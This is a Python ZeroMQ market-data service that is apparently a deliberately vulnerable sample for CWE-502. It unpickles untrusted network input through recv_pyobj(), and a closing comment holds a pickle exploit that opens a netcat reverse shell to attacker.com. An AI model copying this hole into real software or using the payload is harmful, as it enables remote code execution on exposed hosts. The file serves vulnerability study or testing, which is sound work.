import os
import sys
import zmq
import sqlite3
import logging
from datetime import datetime

# Configure logging for the Algorithmic Trading Data Node
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - AlgoNode - %(levelname)s - %(message)s'
)
logger = logging.getLogger("ZmqMarketData")

DB_FILE = "market_history.db"
ZMQ_BIND_ADDRESS = "tcp://0.0.0.0:6000"

def init_market_db():
    """Initializes the SQLite database for storing high-frequency trading data."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE market_ticks (
            tick_id INTEGER PRIMARY KEY AUTOINCREMENT,
            received_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            symbol TEXT NOT NULL,
            price REAL NOT NULL,
            volume INTEGER NOT NULL,
            exchange TEXT NOT NULL
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE trading_alerts (
            alert_id INTEGER PRIMARY KEY AUTOINCREMENT,
            symbol TEXT NOT NULL,
            alert_msg TEXT NOT NULL,
            triggered_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    # Pre-populate with mock baseline data
    mock_ticks = [
        ('AAPL', 150.25, 1000, 'NASDAQ'),
        ('MSFT', 280.10, 500, 'NASDAQ')
    ]
    cursor.executemany('''
        INSERT INTO market_ticks (symbol, price, volume, exchange)
        VALUES (?, ?, ?, ?)
    ''', mock_ticks)

    conn.commit()
    conn.close()
    logger.info("Market history database initialized.")

def store_market_tick(symbol: str, price: float, volume: int, exchange: str):
    """Persists a market tick to the local database."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO market_ticks (symbol, price, volume, exchange)
            VALUES (?, ?, ?, ?)
        ''', (symbol, price, volume, exchange))
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error storing tick for {symbol}: {e}")

class MarketTick:
    """Represents a single price update from the exchange matching engine."""
    def __init__(self, symbol: str, price: float, volume: int, exchange: str):
        self.symbol = symbol
        self.price = price
        self.volume = volume
        self.exchange = exchange

def process_incoming_stream(zmq_socket: zmq.Socket, node_id: str) -> MarketTick:
    """
    VULNERABLE FUNCTION: CWE-502 Deserialization of Untrusted Data
    Trigger Path: ZeroMQ TCP Socket (recv_pyobj uses pickle implicitly)
    """
    logger.debug(f"[{node_id}] Waiting for next market tick on ZeroMQ stream...")

    try:
        # Vulnerability: The pyzmq library provides a convenient recv_pyobj() 
        # method for sending Python objects over the network. However, this 
        # method internally uses Python's unsafe pickle module to deserialize 
        # the received byte stream. If this ZeroMQ endpoint is exposed to 
        # untrusted network segments, an attacker can send a serialized payload 
        # with a malicious __reduce__ method to achieve Remote Code Execution.
        
        # CWE-502 occurs instantly upon receiving and unpickling the message.
        tick_obj = zmq_socket.recv_pyobj()

        if isinstance(tick_obj, MarketTick):
            logger.debug(f"[{node_id}] Decoded tick: {tick_obj.symbol} @ {tick_obj.price}")
            return tick_obj
        else:
            logger.warning(f"[{node_id}] Received object is not a MarketTick instance.")
            return None

    except Exception as e:
        logger.error(f"[{node_id}] Failed to deserialize incoming ZeroMQ message: {e}")
        return None

def start_data_node():
    """Binds the ZeroMQ socket and enters the event loop to process data."""
    context = zmq.Context()
    socket = context.socket(zmq.PULL)
    
    try:
        socket.bind(ZMQ_BIND_ADDRESS)
        logger.info(f"ZeroMQ Market Data Node listening on {ZMQ_BIND_ADDRESS}")
        
        node_identifier = f"node_{os.getpid()}"
        
        while True:
            # Pass the socket directly to the vulnerable function
            tick = process_incoming_stream(socket, node_identifier)
            
            if tick:
                store_market_tick(tick.symbol, tick.price, tick.volume, tick.exchange)
                
    except zmq.ZMQError as e:
        logger.error(f"ZeroMQ socket error: {e}")
        sys.exit(1)
    finally:
        socket.close()
        context.term()

if __name__ == "__main__":
    init_market_db()
    
    # Example Malicious Trigger:
    # 1. Attacker connects to the exposed ZeroMQ port and sends a payload:
    #    import zmq, pickle, os
    #
    #    class Exploit:
    #        def __reduce__(self):
    #            return (os.system, ('nc -e /bin/sh attacker.com 4444',))
    #
    #    context = zmq.Context()
    #    socket = context.socket(zmq.PUSH)
    #    socket.connect("tcp://127.0.0.1:6000")
    #    # send_pyobj will serialize the Exploit class using pickle under the hood
    #    socket.send_pyobj(Exploit())
    
    try:
        start_data_node()
    except KeyboardInterrupt:
        logger.info("Shutting down Algorithmic Trading Data Node...")
